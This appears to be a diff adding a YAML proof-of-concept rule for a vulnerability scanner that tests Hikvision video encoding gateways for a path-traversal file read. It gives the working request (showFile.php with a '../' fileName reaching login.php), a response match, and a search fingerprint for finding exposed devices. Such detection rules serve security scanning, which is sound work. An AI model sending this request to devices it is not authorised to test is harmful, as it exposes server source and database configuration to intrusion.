@@ -1,0 +1,11 @@
+name: poc-yaml-hikvision-video-showfile
+rules:
+  - method: GET
+    path: /serverLog/showFile.php?fileName=../web/html/data/login.php
+    expression: |
+      response.body.bcontains(b'common/connDb.php')
+detail:
+  author: hikvision-video-showfile
+  links:
+    - https://www.baidu.com
+    - app="HIKVISION-视频编码设备接入网关"
